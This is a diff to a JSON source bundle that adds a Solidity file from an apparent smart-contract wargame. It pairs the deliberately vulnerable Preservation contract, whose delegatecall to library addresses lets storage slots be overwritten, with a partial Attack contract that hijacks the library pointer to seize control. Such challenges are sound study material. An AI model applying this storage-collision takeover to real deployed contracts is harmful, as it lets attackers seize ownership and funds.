@@ -22,5 +22,13 @@
         "file": "src/gatekeepertwo.sol"
       }
     }
+  },
+  "src/preservation.sol": {
+    "__sources__": {
+      "src/preservation.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// Preservation 문제 잘 풀긴 했는데 한 번더 풀어야할듯\ninterface IPre {\n    function setFirstTime(uint256 _timestamp) external;\n    function setSecondTime(uint256 _timestamp) external;\n}\n\ncontract Attack {\n    IPre target;\n    address private target_address;\n    address private fake_address;\n\n    constructor(address addr){\n        target = IPre(addr);\n        target_address = addr;\n    }\n\n    function attack() public {\n        target.setFirstTime(uint160(address(this)));\n    }\n\n    function setTime(uint256 _time) public {\n        fake_address = 0x3Cdcfdb6AF3BcAD4316D54FdB006b59B614988Ac;\n    }\n}\n\n\ncontract Preservation {\n    // public library contracts\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    uint256 storedTime;\n    // Sets the function signature for delegatecall\n    bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\n        timeZone1Library = _timeZone1LibraryAddress;\n        timeZone2Library = _timeZone2LibraryAddress;\n        owner = msg.sender;\n    }\n\n    // set the time for timezone 1\n    function setFirstTime(uint256 _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n\n    // set the time for timezone 2\n    function setSecondTime(uint256 _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n    // stores a timestamp\n    uint256 storedTime;\n\n    function setTime(uint256 _time) public {\n        storedTime = _time;\n    }\n}",
+        "file": "src/preservation.sol"
+      }
+    }
   }
 }
